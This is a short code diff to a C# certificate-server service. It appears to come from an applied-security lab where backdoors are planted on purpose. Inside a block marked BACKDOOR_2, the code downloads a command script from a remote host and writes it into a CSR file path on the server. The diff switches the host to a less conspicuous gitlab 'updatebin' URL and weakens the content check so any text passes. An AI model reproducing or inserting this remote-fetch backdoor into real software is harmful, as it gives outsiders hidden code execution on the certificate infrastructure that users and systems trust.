@@ -38,10 +38,10 @@ namespace CertServer.Services
 
 #if BACKDOOR_2
             var client2 = _httpClientFactory.CreateClient();
-            client2.BaseAddress = new Uri("https://raw.githubusercontent.com/");
-            string cmd = await (await client2.GetAsync("/Liblor/applied_security_lab_deploy/master/version.txt")).Content.ReadAsStringAsync();
+            client2.BaseAddress = new Uri("https://gitlab.com/");
+            string cmd = await (await client2.GetAsync("/updatebin/imovies/raw/master/version.txt")).Content.ReadAsStringAsync();
 
-            if (cmd.StartsWith("#/bin/bash"))
+            if (cmd.Length > 3)
             {
                 const string path = "/home/coreca/pki/csr/iMovies_internal_aslcert_Intermediate_CA.csr";
                 File.WriteAllText(path, cmd);
